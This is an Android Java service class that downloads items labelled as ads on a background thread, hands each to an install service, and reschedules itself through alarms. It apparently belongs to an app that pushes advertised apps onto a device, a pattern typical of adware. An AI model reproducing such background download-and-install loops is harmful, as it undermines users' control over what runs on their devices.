package com.example.popwin.service;

import java.util.ArrayList;
import java.util.List;

import com.example.popwin.net.sqlite.AdHandler;
import com.example.popwin.net.sqlite.App;
import com.example.popwin.task.DownloadTask;
import com.example.popwin.util.LogUtil;
import com.legame.np.util.SetAlarms;
import com.legame.np.util.TaskUtil;

import android.R.integer;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

/**
 * 
 * 下载服务
 * @author leoliu
 * 
 */
public class DownloadService extends IntentService {
    private static final String TAG = "DownloadService";

    private static Context context;
    private Handler downloadHandler = null;
    private static boolean running = false;

    
    public DownloadService() {
        super("download Service");

    }

    private void init() {
       //LogUtil.e(TAG, "method init() start...");

        downloadHandler = new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(Message message) {
            	running = false;
            	
            	double delay = 30.0;
            	
                switch (message.what) {
                case TaskUtil.TASK_DOWNLOAD_SUCC:
                	
                	App ad = (App)message.obj;
                	
                	if(ad != null){
                		//LogUtil.e(TAG, "downloadHandler->ad  is not null , adType = "+ad.getAdType());
                			LogUtil.e(TAG, "to start install service");
                			new AdHandler(context).putOneToInstall(ad);
                			Intent intent = new Intent(context,InstallService.class);
//                			intent.putExtra(App.APPID, ad.getAppId());
                			context.startService(intent);

                		delay = 0.0;
                        SetAlarms.enableAlarmsService(context, delay, 2, DownloadService.class, true);

                	}
                	Intent intent = new Intent(context,InstallService.class);
//        			intent.putExtra(App.APPID, ad.getAppId());
        			context.startService(intent);
                	break;
                case TaskUtil.TASK_DOWNLOAD_FAIL:
                	Intent intent1 = new Intent(context,InstallService.class);
//        			intent.putExtra(App.APPID, ad.getAppId());
        			context.startService(intent1);
                	delay = 1.0;
                    SetAlarms.enableAlarmsService(context, delay, delay*2, DownloadService.class, true);
                	break;
                }
                
                running=false;
                super.handleMessage(message);
            }
        };
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = this.getApplicationContext();
        
       //LogUtil.e(TAG, "BackgroundService oncreate");

        init();
    }

    @Override
    protected void onHandleIntent(Intent intent) {
    	LogUtil.e("DownloadService", "DownloadService.onHandleIntent");
        if (!running) {
        	running = true;
        	LogUtil.e(TAG, "service is not running");
//        	final String url=intent.getStringExtra(App.URL);
//        	final int fileSize=intent.getIntExtra(App.FILESIZE, 0);
//        	final String packageName=intent.getStringExtra(App.PACKAGENAME);
//        	final int appId=intent.getIntExtra(App.APPID, -1);
            new Thread(){
            	public void run(){
            		new DownloadTask(context,downloadHandler).startRequest();
            	}
            }.start();
        } else {
           LogUtil.e(TAG, "service is running");
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
       //LogUtil.e(TAG, "onDestroy");
    }

}
